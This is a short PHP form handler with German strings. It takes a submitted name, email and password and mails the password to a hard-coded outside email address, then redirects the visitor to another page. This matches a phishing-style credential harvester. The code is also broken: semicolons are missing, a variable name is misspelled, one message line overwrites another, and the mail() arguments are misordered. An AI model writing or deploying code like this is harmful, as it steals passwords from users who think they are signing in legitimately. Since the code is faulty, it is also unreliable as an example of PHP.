<?php

    if(isset($_POST['submit'])) {

            
            $name = $_POST['name'];
            $mailFrom = $_POST['email'];
            $password = $_POST['password'];

            $mailTo = "soundbutton2.0@gmx.de";
            $headers = "Von: ".$mailFrom;
            $txt = "Du hast eine Email von ".$name." bekommen.\n\n"
            $txt = "das ist das Password: ".$passowrd."von: ".$name." \n\n"


            mail($mailTo, $txt, $headers);

            header("Location: index2.html")


    }






?>